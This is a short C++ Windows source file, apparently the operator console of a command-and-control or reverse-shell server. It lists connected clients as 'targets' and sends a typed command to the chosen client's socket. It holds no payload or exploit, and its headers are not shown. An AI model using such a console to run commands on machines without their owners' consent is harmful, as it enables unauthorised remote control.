#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <vector>
#include <iostream>
#include "client.hpp"
#include "server.hpp"

DWORD WINAPI cli_thread(LPVOID arg)
{
    Server *server = (Server *)arg;

    while (true)
    {
        printf("\033[2J\033[H");
        printf("Options:\n");
        printf("[1] Choose Target\n");
        printf("[2] Quit\n> ");
        fflush(stdout);

        std::string input;
        std::getline(std::cin, input);

        if (input == "1")
        {
            printf("\033[2J\033[H");
            printf("Choose client (0 - %d):\n> ", (int)server->clients.size() - 1);

            std::getline(std::cin, input);
            int target = atoi(input.c_str());

            if (target < 0 || target >= (int)server->clients.size())
            {
                printf("Error: Invalid target\n");
                Sleep(1000);
                continue;
            }

            printf("Enter command:\n> ");
            std::getline(std::cin, input);

            if (input.empty())
            {
                printf("Error: Empty command\n");
                Sleep(1000);
                continue;
            }

            std::string cmd = input + "\n";

            send(server->clients[target].socket, cmd.c_str(), cmd.size(), 0);
        }
        else if (input == "2")
        {
            printf("Bye\n");
            Sleep(1000);
            exit(0);
        }
        else
        {
            printf("Invalid option\n");
            Sleep(1000);
        }
    }
    return 0;
}